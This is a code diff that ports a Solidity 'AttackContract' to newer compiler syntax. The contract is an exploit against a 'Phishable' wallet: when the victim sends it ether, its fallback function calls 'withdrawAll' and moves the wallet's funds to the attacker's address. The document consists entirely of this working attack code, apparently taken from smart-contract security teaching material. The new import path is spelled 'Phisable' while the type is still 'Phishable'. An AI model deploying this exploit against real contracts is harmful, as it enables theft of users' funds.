@@ -4,19 +4,19 @@
 // Version of Solidity compiler this program was written for
 pragma solidity ^0.6.4;
 
-import "Phishable.sol";
+import "contracts/Phisable.sol";
 
 contract AttackContract {
 
     Phishable phishableContract;
-    address attacker; // The attacker's address to receive funds
+    address payable attacker; // The attacker's address to receive funds
 
-    constructor (Phishable _phishableContract, address _attackerAddress) {
+    constructor (Phishable _phishableContract, address payable _attackerAddress) public {
         phishableContract = _phishableContract;
         attacker = _attackerAddress;
     }
 
-    function () payable {
+    fallback() payable external {
         phishableContract.withdrawAll(attacker);
     }
 }
